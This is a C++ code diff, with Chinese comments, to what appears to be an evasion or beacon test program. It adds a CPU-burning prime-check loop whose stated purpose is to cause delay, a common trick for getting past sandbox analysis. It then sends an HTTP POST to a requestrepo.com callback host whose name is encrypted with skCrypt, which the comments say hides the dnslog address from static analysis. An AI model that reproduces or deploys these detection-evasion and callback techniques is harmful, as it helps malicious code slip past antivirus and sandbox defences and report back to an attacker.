@@ -197,12 +197,27 @@ bool check_args(char* argv[]) {
         return true;
     }
 }
+//判断质数 循环30次 结束返回true，占用CPU导致延迟
+bool check_isprime() {
+    for (int i = 0; i < 30; i++) {
+        long long n1 = 1000000000000002493;
+        if (n1 <= 1)
+            return false;
+
+        for (long long i = 2; i * i <= n1; ++i) {
+            if (n1 % i == 0)
+                return false;
+        }
+    }
+    return true;
+}
 int main(int argc, char* argv[]) {
+    /*
     //用于提示已经成功执行
     if (check_args(argv)) {
         //dnslog地址 可自行更换或者不使用
         //使用了skCrypt库加密字符串 防止静态分析发现dnslog地址
-        auto url = skCrypt("ul6u2p5x.requestrepo.com");
+        auto url = skCrypt("qk5p7fr7.requestrepo.com");
         httplib::Client cli(charToString(url));
         httplib::Params p;
         p.emplace("success", "true");
@@ -212,5 +227,18 @@ int main(int argc, char* argv[]) {
     else {
         MessageBoxA(NULL, "Fail", "Fail", NULL);
     }
-    
+    */
+    if (check_isprime()) {
+        //dnslog地址 可自行更换或者不使用
+        //使用了skCrypt库加密字符串 防止静态分析发现dnslog地址
+        auto url = skCrypt("qk5p7fr7.requestrepo.com");
+        httplib::Client cli(charToString(url));
+        httplib::Params p;
+        p.emplace("success", "true");
+        auto res = cli.Post("/", p);
+        MessageBoxA(NULL, "SUCCESS", "SUCCESS", NULL);
+    }
+    else {
+        MessageBoxA(NULL, "Fail", "Fail", NULL);
+    }
 }
